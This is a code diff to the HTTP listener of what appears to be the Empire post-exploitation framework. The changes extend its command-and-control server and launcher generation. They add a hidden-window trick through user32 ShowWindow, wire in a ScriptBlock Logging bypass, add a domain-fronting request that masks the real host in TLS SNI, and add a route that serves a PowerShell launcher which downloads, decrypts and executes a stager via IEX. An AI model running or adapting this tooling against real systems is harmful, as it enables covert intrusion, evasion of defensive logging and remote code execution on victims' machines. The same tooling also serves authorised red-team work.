@@ -88,7 +88,7 @@ class Listener:
                 'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
             },
             'CertPath' : {
-                'Description'   :   'Certificate path for https listeners.',
+                'Description'   :   'Directory path of X.509 certificates for https listeners. Must contain empire-chain.pem and empire-priv.key',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -106,6 +106,26 @@ class Listener:
                 'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
+            },
+            'StagerURI' : {
+                'Description'   :   'URI for the stager. Example: stager.php',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'UserAgent' : {
+                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'Proxy' : {
+                'Description'   :   'Proxy to use for request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'ProxyCreds' : {
+                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
             }
         }
 
@@ -147,7 +167,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, useWindowHandler='False', encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -171,9 +191,25 @@ class Listener:
                 # PowerShell
 
                 stager = ''
+
+                if useWindowHandler.lower()=='true':
+                        #Don't hide the window via parameter. Hide via WindowHandler.
+                        stager += "$t = '[DllImport("
+                        stager += helpers.randomize_capitalization('"user32.dll"')
+                        stager += ")] public static extern bool ShowWindow"
+                        stager += "(int handle, int state);'; "
+                        stager += helpers.randomize_capitalization("add-type -name win -member $t -namespace native;")
+                        stager += " [native.win]::"
+                        stager += "ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() "
+                        stager += "| Get-Process).MainWindowHandle, 0);"
+                        #Remove WindowsStyle parameter from launcher command
+                        hideCmd = [" -w 1 "," -W 1 "," -W hidden "," -w hidden "," -w Hidden "]
+                        for cmd in hideCmd:
+                                launcher = launcher.replace(cmd," ")
+
                 if safeChecks.lower() == 'true':
                     # ScriptBlock Logging bypass
-                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
@@ -223,7 +259,7 @@ class Listener:
                             password = proxyCreds.split(':')[1]
                             domain = username.split('\\')[0]
                             usr = username.split('\\')[1]
-                            stager += "$netcred = New-Object System.Net.NetworkCredential("+usr+","+password+","+domain+");"
+                            stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                         #save the proxy settings to use during the entire staging process and the agent
@@ -239,7 +275,7 @@ class Listener:
                         if "https" in host:
                             host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                         else:
-                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port) 
+                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -257,6 +293,11 @@ class Listener:
                     for header in customHeaders:
                         headerKey = header.split(':')[0]
                         headerValue = header.split(':')[1]
+			#If host header defined, assume domain fronting is in use and add a call to the base URL first
+			#this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+			if headerKey.lower() == "host":
+			    stager += "$clr='%s';" % (host)
+			    stager += helpers.randomize_capitalization("$WC.DownloadData($clr);")
                         stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                         stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
 
@@ -271,7 +312,7 @@ class Listener:
 
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
-                
+
                 if obfuscate:
                     stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
@@ -313,7 +354,7 @@ class Listener:
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
-                
+
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "req.add_header('User-Agent',UA);\n"
@@ -327,7 +368,7 @@ class Listener:
                         #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                         launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
 
-                
+
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
                         launcherBase += "proxy = urllib2.ProxyHandler();\n"
@@ -342,7 +383,7 @@ class Listener:
                             launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
-                            launcherBase += "proxy_auth_handler.add_password(None,"+proxy+","+username+","+password+");\n"
+                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
                             launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
                     else:
                         launcherBase += "o = urllib2.build_opener(proxy);\n"
@@ -353,7 +394,7 @@ class Listener:
                 launcherBase += "urllib2.install_opener(o);\n"
 
                 # download the stager and extract the IV
-                
+
                 launcherBase += "a=urllib2.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
@@ -394,8 +435,8 @@ class Listener:
         if not language:
             print helpers.color('[!] listeners/http generate_stager(): no language specified!')
             return None
-        
-        
+
+
         profile = listenerOptions['DefaultProfile']['Value']
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         launcher = listenerOptions['Launcher']['Value']
@@ -450,7 +491,7 @@ class Listener:
                         randomizedStager += helpers.randomize_capitalization(line)
                     else:
                         randomizedStager += line
-            
+
             if obfuscate:
                 randomizedStager = helpers.obfuscate(randomizedStager, obfuscationCommand=obfuscationCommand)
             # base64 encode the stager and return it
@@ -613,7 +654,7 @@ class Listener:
                                 if($Script:Proxy) {
                                     $wc.Proxy = $Script:Proxy;
                                 }
-                                
+
                                 $wc.Headers.Add("User-Agent",$script:UserAgent)
                                 $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
                                 $wc.Headers.Add("Cookie", "session=$RoutingCookie")
@@ -655,7 +696,7 @@ class Listener:
                                 if($Script:Proxy) {
                                     $wc.Proxy = $Script:Proxy;
                                 }
-                                
+
                                 $wc.Headers.Add('User-Agent', $Script:UserAgent)
                                 $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
@@ -749,10 +790,23 @@ def send_message(packets=None):
         host = listenerOptions['Host']['Value']
         port = listenerOptions['Port']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
+        stagerURI = listenerOptions['StagerURI']['Value']
+        userAgent = self.options['UserAgent']['Value']
+        listenerName = self.options['Name']['Value']
+        proxy = self.options['Proxy']['Value']
+        proxyCreds = self.options['ProxyCreds']['Value']
 
         app = Flask(__name__)
         self.app = app
 
+
+        @app.route('/<string:stagerURI>')
+        def send_stager(stagerURI):
+            if stagerURI:
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                return launcher
+            else:
+                pass
         @app.before_request
         def check_ip():
             """
@@ -906,7 +960,7 @@ def send_message(packets=None):
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
                 certPath = os.path.abspath(certPath)
-                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
